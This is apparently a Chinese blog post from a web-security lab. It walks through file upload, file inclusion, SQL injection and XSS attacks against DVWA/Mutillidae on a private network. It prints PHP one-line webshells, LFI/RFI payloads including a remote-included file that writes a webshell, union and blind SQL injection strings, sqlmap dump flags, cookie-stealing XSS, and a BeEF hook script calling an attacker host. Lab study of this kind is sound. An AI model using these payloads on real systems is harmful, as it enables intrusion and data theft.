@@ -1,0 +1,1156 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://volantis.js.org/#0.0.1'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+    <title>web安全的了解 - 东风未起，念你成疾</title>
+  
+    <meta name="keywords" content="web安全">
+  
+  
+    <meta name="description" content="1.文件上传漏洞 2. 文件包含漏洞 3.sql’注入攻击 4. 跨站脚本攻击 
+
+web引擎收集
+">
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="东风未起，念你成疾">
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+
+  
+
+  
+  <link rel="shortcut icon" type='image/x-icon' href="https://cdn.jsdelivr.net/gh/xaoxuu/assets@master/favicon/favicon.ico">
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10/dist/APlayer.min.css">
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  <script>
+    function setLoadingBarProgress(num) {
+      document.getElementById('loading-bar').style.width=num+"%";
+    }
+  </script>
+
+  
+  
+</head>
+
+<body>
+  
+  <div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+<header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h'>
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+          
+            东风 <b><sup style='color:#3AA757'>0.0.1</sup></b>
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+
+</header>
+
+<script>setLoadingBarProgress(40);</script>
+
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper'>
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2020/10/24/web%E5%AE%89%E5%85%A8%E7%9A%84%E4%BA%86%E8%A7%A3/">
+      web安全的了解
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a href="https://zfyvip.xyz" target="_blank" rel="nofollow noopener">
+    <img src="https://t1.picb.cc/uploads/2020/05/24/tyaD1j.jpg">
+    <p>ZFY</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Oct 24, 2020</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          <p>1.文件上传漏洞 2. 文件包含漏洞 3.sql’注入攻击 4. 跨站脚本攻击 </p>
+<ol start="5">
+<li>web引擎收集</li>
+</ol>
+<a id="more"></a>
+
+<h1 id="web安全的了解"><a href="#web安全的了解" class="headerlink" title="web安全的了解"></a>web安全的了解</h1><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h3 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理:"></a>实验原理:</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.文件上传(File Upload)是大部分web应用都具备的功能,例如:用户上传附件,修改头像,分享图片.视频等</span><br><span class="line">2.正常的文件一般是文档,图片,视频等,web应用收集之后放入后台的存储,需要的时候再返回</span><br><span class="line">3.如果是恶意的文件如:php,asp等执行文件绕过web应用,并顺利执行,则相当于黑客直接拿到webshell</span><br><span class="line">4.一旦黑客拿到webshell,则可以拿到web应用的数据,删除web文件,本地提权,进一步拿下服务器甚至内网</span><br><span class="line">5.sql注入攻击的主要对象是数据库服务,文件上传漏洞主要是web服务,实际渗透两种相结合,达到对目标的深度控制.</span><br></pre></td></tr></table></figure>
+
+<h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'zhufuyi'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="网页代码一"><a href="#网页代码一" class="headerlink" title="网页代码一"></a>网页代码一</h3><p><img src="http://weep.fun/1.png" alt=""></p>
+<h4 id="使用菜刀工具进入网站的根目录"><a href="#使用菜刀工具进入网站的根目录" class="headerlink" title="使用菜刀工具进入网站的根目录"></a>使用菜刀工具进入网站的根目录</h4><p><img src="http://weep.fun/2.png" alt=""></p>
+<p>连接使用虚拟终端</p>
+<p><img src="http://weep.fun/3.png" alt=""></p>
+<h3 id="网页代码二"><a href="#网页代码二" class="headerlink" title="网页代码二"></a>网页代码二</h3><p><img src="C:%5CUsers%5CAdministrator%5CDesktop%5C%E4%B8%89%E7%BB%84%E6%9C%B1%E6%B5%AE%E7%BF%BC%E6%99%A8%E5%88%86%E4%BA%AB%5Cweb%E5%AE%89%E5%85%A8%E7%9A%84%E4%BA%86%E8%A7%A3.assets%5C4.png" alt=""></p>
+<h4 id="使用神器burpsuit"><a href="#使用神器burpsuit" class="headerlink" title="使用神器burpsuit"></a>使用神器burpsuit</h4><p><img src="http://weep.fun/5.png" alt=""></p>
+<p>将content-type:(二进制流)修改为image/jpeg就可以成功上传</p>
+<p><img src="http://weep.fun/6.png" alt=""></p>
+<h3 id="网页代码三"><a href="#网页代码三" class="headerlink" title="网页代码三"></a>网页代码三</h3><h4 id="对上传文件的后缀进行了限制"><a href="#对上传文件的后缀进行了限制" class="headerlink" title="对上传文件的后缀进行了限制"></a>对上传文件的后缀进行了限制</h4><p><img src="http://weep.fun/7.png" alt=""></p>
+<h3 id="webshell的木马程序"><a href="#webshell的木马程序" class="headerlink" title="webshell的木马程序"></a>webshell的木马程序</h3><h4 id="小马-一句话木马-即整个shell代码量只有一行-一般是系统执行函数"><a href="#小马-一句话木马-即整个shell代码量只有一行-一般是系统执行函数" class="headerlink" title="小马:一句话木马,即整个shell代码量只有一行,一般是系统执行函数"></a>小马:一句话木马,即整个shell代码量只有一行,一般是系统执行函数</h4><h4 id="大马-代码量和功能一样-一般会进行二进制加密-防止防火墙-入侵系统检测"><a href="#大马-代码量和功能一样-一般会进行二进制加密-防止防火墙-入侵系统检测" class="headerlink" title="大马:代码量和功能一样,一般会进行二进制加密,防止防火墙/入侵系统检测"></a>大马:代码量和功能一样,一般会进行二进制加密,防止防火墙/入侵系统检测</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#eval 使用php函数  例如: phpinfo();</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_REQUEST[<span class="string">'zhufuyi'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">#http://192.168.215.128/dvwa/hackable/uploads/shell2.php?zhufuyi=phpinfo();</span></span><br><span class="line"><span class="comment">#system 使用linux系统命令,例如ls,cp,rm</span></span><br><span class="line"><span class="meta">&lt;?php</span> system($_REQUEST[<span class="string">'zhufuyi'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">    http:<span class="comment">//192.168.215.128/dvwa/hackable/uploads/shell3.php?zhufuyi=id</span></span><br><span class="line">	http:<span class="comment">//192.168.215.128/dvwa/hackable/uploads/shell3.php?zhufuyi=cat /etc/hosts</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="小马演示"><a href="#小马演示" class="headerlink" title="小马演示:"></a>小马演示:</h4><p><img src="http://weep.fun/8.png" alt=""></p>
+<h4 id="大马"><a href="#大马" class="headerlink" title="大马:"></a>大马:</h4><p><img src="http://weep.fun/9.png" alt=""></p>
+<h4 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀:"></a>中国菜刀:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用菜刀连接</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#说明:request是在网页端进行变量访问,post是使用工具进行连接,是c/s架构.</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="防御以及后期处理"><a href="#防御以及后期处理" class="headerlink" title="防御以及后期处理"></a>防御以及后期处理</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.上传的时候拦截,代码层面上进行加强上传文件的加强,通过web应用防火墙对带这种特征信息的文件拦截</span><br><span class="line">2.中招后,从网站的文件进行过滤一下,过滤关键字,用fgrep(没有元字符,一切都是常规字符)</span><br><span class="line">fgrep -R 'eval($_POST[' /var/www/dvwa'])'</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>路径:   <code>/var/www/dvwa/vulnerabilities/fi/</code></p>
+<p>原因: 代码中导入模块使用 <code>include *</code>,<code>include *.php</code>等对包含的文件没有检测</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">	意思是当服务器开启allow_url_include选项时,就可以通过php的某些特性函数(include(),require()和include_once(),require_once()),利用url动态包含文件,此时如果没有对文件进行严格审查,就会导致任意文件读取或者任意执行命令.</span></span><br><span class="line"><span class="code">	文件漏洞包含本地漏洞和远程文件包含漏洞,远程文件包含漏洞是因为开启了php配置的allow_url_fopen选项(选项开启后,服务器允许包含一个远程的文件).服务器通过php的特性(函数)去包含任意文件时,由于要包含的文件来源过滤不严,从而包含一个恶意文件,而我们可以构造这个恶意文件来达到自己的人目的.</span></span><br><span class="line"></span><br><span class="line">1.文件包含漏洞即程序通过包含函数调用本地或远程文件,依次来实现拓展功能</span><br><span class="line">2.被包含的文件可以是各种文件格式,而文件包含了恶意代码,则会形成远程命令执行或文件上传漏洞</span><br><span class="line">3.文件包含漏洞主要发生在包含语句环境中.</span><br></pre></td></tr></table></figure>
+
+<h3 id="低安全级别"><a href="#低安全级别" class="headerlink" title="低安全级别"></a>低安全级别</h3><h4 id="本地文件包含-webshell"><a href="#本地文件包含-webshell" class="headerlink" title="本地文件包含+webshell"></a>本地文件包含+webshell</h4><p><a href="http://192.168.215.128/dvwa/vulnerabilities/fi/?page=include.php" target="_blank" rel="noopener">http://192.168.215.128/dvwa/vulnerabilities/fi/?page=include.php</a></p>
+<p>代码:</p>
+<p><img src="http://weep.fun/10.png" alt=""></p>
+<p><a href="http://192.168.215.128/dvwa/vulnerabilities/fi/?page=/etc/mysql/my.cnf" target="_blank" rel="noopener">http://192.168.215.128/dvwa/vulnerabilities/fi/?page=/etc/mysql/my.cnf</a></p>
+<p><a href="http://192.168.215.128/dvwa/vulnerabilities/fi/?page=/etc/passwd" target="_blank" rel="noopener">http://192.168.215.128/dvwa/vulnerabilities/fi/?page=/etc/passwd</a></p>
+<p>查看网站的robots.txt   ls /var/www/dvwa/robots.txt </p>
+<p><a href="http://192.168.215.128/dvwa/vulnerabilities/fi/?page=/var/www/dvwa/robots.txt" target="_blank" rel="noopener">http://192.168.215.128/dvwa/vulnerabilities/fi/?page=/var/www/dvwa/robots.txt</a></p>
+<p><img src="http://weep.fun/11.png" alt=""></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>制作图片木马</span><br><span class="line">    <span class="meta">&lt;?</span>fputs(fopen(<span class="string">"shell20.php"</span>,<span class="string">"w"</span>),<span class="string">'&lt;?php eval($_POST[zhufuyi]);?&gt;'</span>)<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">2.</span>上传图片</span><br><span class="line">    <span class="comment">#上传后的文件路径 /var/www/dvwa/hackable/uploads</span></span><br><span class="line"><span class="number">3.</span>执行图片</span><br><span class="line">    <span class="comment">#生成的文件路径 /var/www/dvwa/vulnerabilities/fi</span></span><br><span class="line"><span class="number">4.</span>通过菜刀连接   </span><br><span class="line">   http:<span class="comment">//192.168.215.128/dvwa/vulnerabilities/fi/shell20.php</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://weep.fun/12.png" alt=""></p>
+<h4 id="远程文件包含-webshell"><a href="#远程文件包含-webshell" class="headerlink" title="远程文件包含+webshell"></a>远程文件包含+webshell</h4><p><strong><a href="http://192.168.215.128/dvwa/vulnerabilities/fi/?page=http://web_server/u.php" target="_blank" rel="noopener">http://192.168.215.128/dvwa/vulnerabilities/fi/?page=http://web_server/u.php</a></strong></p>
+<p>使用Linux开启apache2服务器</p>
+<p><img src="http://weep.fun/13.png" alt=""></p>
+<p>使用 ip a 查看apache2 </p>
+<p><img src="http://weep.fun/14.png" alt=""></p>
+<p>浏览器访问192.168.215.129</p>
+<p><img src="http://weep.fun/15.png" alt=""></p>
+<p><code>vim /var/www/html/zhufuyi.txt</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>fputs(fopen(<span class="string">"shell50.php"</span>,<span class="string">"w"</span>),<span class="string">'&lt;?php eval($_POST[zhufuyi]);?&gt;'</span>)<span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">#http://192.168.215.129/zhufuyi.txt</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://weep.fun/16.png" alt=""></p>
+<p>在靶机的文件包含漏洞修改路径,然后在网站的根目录下查看文件内容</p>
+<p><img src="http://weep.fun/17.png" alt=""></p>
+<p><img src="http://weep.fun/18.png" alt=""></p>
+<p>查看文件内容</p>
+<p><img src="http://weep.fun/19.png" alt=""></p>
+<p>使用菜刀连接查看网站</p>
+<p><img src="http://weep.fun/20.png" alt=""></p>
+<h3 id="中安全级别"><a href="#中安全级别" class="headerlink" title="中安全级别"></a>中安全级别</h3><p>代码:</p>
+<p><img src="http://weep.fun/21.png" alt=""></p>
+<p>本地网站包含漏洞没有影响,限制了远程包含的 http,https,替换成空</p>
+<p>所以我们把网址改变一下</p>
+<p><code>hthttp://tp://</code>  —–&gt; <code>http://</code> = —-&gt;<code>http://</code></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.215.128/dvwa/vulnerabilities/fi/?page=http://192.168.215.129/zhufuyi.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.215.128/dvwa/vulnerabilities/fi/?page=hthttp://http://192.168.215.129/zhufuyi1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://weep.fun/22.png" alt=""></p>
+<h3 id="高安全级别"><a href="#高安全级别" class="headerlink" title="高安全级别"></a>高安全级别</h3><p><img src="http://weep.fun/23.png" alt=""></p>
+<p>没有漏洞,但是后期维护很麻烦</p>
+<h2 id="sql注入攻击"><a href="#sql注入攻击" class="headerlink" title="sql注入攻击"></a>sql注入攻击</h2><h3 id="实验原理-1"><a href="#实验原理-1" class="headerlink" title="实验原理:"></a>实验原理:</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql注入攻击指的是通过构建特殊的输入作为传入web应用程序,而这些输入大都是sql语法里的一些组合,而通过执行sql语句而执行攻击值所要的操作,其主要的原因是程序没有细致的过滤用户输入的数据,致使非法数据请入系统</span><br></pre></td></tr></table></figure>
+
+<p>代码:</p>
+<p><img src="http://weep.fun/25.png" alt=""></p>
+<h3 id="基于错误的注入"><a href="#基于错误的注入" class="headerlink" title="基于错误的注入"></a>基于错误的注入</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">错误注入的思路是通过构造特殊的sql语句,根据得到的错误信息,确认SQL注入点;</span><br><span class="line">通过数据库报错信息,也可以探测到数据库的类型和其他有用信息;</span><br><span class="line">通过输入单引导,触发数据库异常,通过错误日志诊断数据库类型,例如mysql数据库</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://weep.fun/0.png" alt=""></p>
+<h3 id="基于布尔的注入"><a href="#基于布尔的注入" class="headerlink" title="基于布尔的注入"></a>基于布尔的注入</h3><p><code>&#39;or 1=1 -- zhufuyi&#39;</code></p>
+<p><img src="http://weep.fun/QQ%E6%88%AA%E5%9B%BE20201025142207.png" alt=""></p>
+<h3 id="基于union注入"><a href="#基于union注入" class="headerlink" title="基于union注入"></a>基于union注入</h3><p>union使用必须前后字段相同</p>
+<p><code>一般通过错误和布尔注入确认点之后,便开始通过union语句来获取有效信息</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#首先根据少凑,多合得到后端 数据列 </span><br><span class="line">select * form dvwa.users union select 1,2,3......</span><br><span class="line">#猜出字段</span><br><span class="line">&#39;union select 1 -- 1&#39;</span><br><span class="line">&#39;union select 1,2 -- &#39;</span><br><span class="line">#获取当前数据库的信息</span><br><span class="line">&#39;union select user(),database() -- &#39;</span><br><span class="line">&#39;union select user,password from users -- &#39;</span><br><span class="line">&#39;union select password,concat(first_name,&#39; &#39;,last_name,&#39; &#39;,user) from users -- &#39;</span><br></pre></td></tr></table></figure>
+
+<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p><code>1&#39; and sleep(5) -- &#39;</code>判断是否有注入点</p>
+<h3 id="information-schema数据库的字典"><a href="#information-schema数据库的字典" class="headerlink" title="information_schema数据库的字典"></a>information_schema数据库的字典</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#information_schema数据库的字典</span><br><span class="line"></span><br><span class="line">#information_schema.table 表</span><br><span class="line">select * from information_schema.TABLES\G;  &#x2F;&#x2F;等价于show databases</span><br><span class="line">&#39;union select TABLE_SCHEMA,1 FROM INFORMATION_SCHEMA.TABLES -- &#39;</span><br><span class="line">#information_schema.columns 列</span><br><span class="line">select * from information_schema.columns\G;</span><br></pre></td></tr></table></figure>
+
+<h3 id="sqlmap自动注入"><a href="#sqlmap自动注入" class="headerlink" title="sqlmap自动注入"></a>sqlmap自动注入</h3><p>官方网站:<a href="http://sqlmap.org" target="_blank" rel="noopener">http://sqlmap.org</a></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap,是自动化检测工具,利用sql注入漏洞,获取数据库服务器的权限,具有强大的检测引擎,针对各种不同的类型的数据库的安全稳定性的测试功能选项.包括获取数据库中存储的数据,访问系统操作文件甚至可以通过外带数据连接的方式执行操作系统命令.</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://weep.fun/QQ%E6%88%AA%E5%9B%BE20201025143903.png" alt=""></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://192.168.215.128/mutillidae/index.php?page=user-info.php&amp;username=zxc&amp;password=zxv&amp;user-info-php-submit-button=View+Account+Details " --batch -p username</span><br></pre></td></tr></table></figure>
+
+<h4 id="sqlmqp参数解析"><a href="#sqlmqp参数解析" class="headerlink" title="sqlmqp参数解析"></a>sqlmqp参数解析</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">--users</span><br><span class="line">--current-user</span><br><span class="line">--dbs</span><br><span class="line">--current-db </span><br><span class="line">-D "database_name" --tables</span><br><span class="line">-D "database<span class="emphasis">_naem" -T "table_</span>bame" --columns</span><br><span class="line"></span><br><span class="line">--dump-all  //全部</span><br><span class="line">--batch //自动化完成</span><br><span class="line">--cookie=""  //用插件获取当前的cookies</span><br></pre></td></tr></table></figure>
+
+<h2 id="跨站脚本攻击XSS"><a href="#跨站脚本攻击XSS" class="headerlink" title="跨站脚本攻击XSS"></a>跨站脚本攻击XSS</h2><h3 id="xss简介"><a href="#xss简介" class="headerlink" title="xss简介"></a>xss简介</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xss是指恶意攻击者,利用网站没有对用户提交的数据进行转义处理或者是过滤不足的缺点,进而添加了一些代码,嵌入到web页面,使别的用户访问都会执行相应的嵌入代码,从而盗取用户资料,利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式.</span><br><span class="line">xss攻击的危害:</span><br><span class="line"><span class="code">	1.盗取各类用户账号</span></span><br><span class="line"><span class="code">	2.控制企业数据,包括读取,篡改,删除</span></span><br><span class="line"><span class="code">	3.盗窃企业重要的商业价值的资料</span></span><br><span class="line"><span class="code">	4.非法转帐</span></span><br><span class="line"><span class="code">	5.强制发送电子邮件</span></span><br><span class="line"><span class="code">	6.网站挂马</span></span><br><span class="line"><span class="code">	7.控制受害者机器及向其他网站发起攻击</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="构造xss脚本"><a href="#构造xss脚本" class="headerlink" title="构造xss脚本"></a>构造xss脚本</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'xss'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">#一旦后端服务器没有过滤特殊字符<span class="tag">&lt;&gt;</span>/'进行过滤,就可以证明存在xss漏洞</span><br><span class="line">window.location</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">location.href=<span class="string">""</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">onload</span><br><span class="line">onsubmit</span><br><span class="line">onerror</span><br><span class="line">#内框架</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"https://www.baidu.com"</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">height</span>=<span class="string">0</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="comment">//可以使用大小写绕开过滤代码&lt;SciPt&gt;</span></span></span><br><span class="line"><span class="actionscript"><span class="comment">//字符编码 采用url,Base64等编码</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="xss反射型"><a href="#xss反射型" class="headerlink" title="xss反射型"></a>xss反射型</h3><p>需要诱导别人点击</p>
+<p><img src="http://weep.fun/QQ%E6%88%AA%E5%9B%BE20201025152324.png" alt=""></p>
+<h3 id="xss存储型"><a href="#xss存储型" class="headerlink" title="xss存储型"></a>xss存储型</h3><p>只要点击该页面就会中招</p>
+<h3 id="自动化xss"><a href="#自动化xss" class="headerlink" title="自动化xss"></a>自动化xss</h3><h4 id="BeEF"><a href="#BeEF" class="headerlink" title="BeEF"></a>BeEF</h4><p><img src="http://weep.fun/QQ%E6%88%AA%E5%9B%BE20201025154623.png" alt=""></p>
+<h4 id="查看是否开启BeEF"><a href="#查看是否开启BeEF" class="headerlink" title="查看是否开启BeEF"></a>查看是否开启BeEF</h4><p>ss -tnlp</p>
+<p><img src="http://weep.fun/QQ%E6%88%AA%E5%9B%BE20201025154925.png" alt=""></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.215.129:3000/hook.js"</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
